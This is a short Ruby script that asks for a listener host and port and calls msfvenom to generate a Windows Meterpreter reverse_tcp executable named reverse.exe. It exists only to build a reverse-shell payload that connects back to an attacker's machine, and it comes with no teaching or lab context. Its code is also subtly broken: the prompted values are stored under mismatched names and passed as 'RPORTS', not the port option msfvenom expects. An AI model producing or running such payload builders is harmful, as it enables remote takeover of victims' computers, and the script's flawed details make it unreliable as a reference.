print "add lhost:"

rhost = gets

print "add lport:"

rport = gets

system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + rhost + " " + "RPORTS=" + rport + " " + "-f exe > reverse.exe")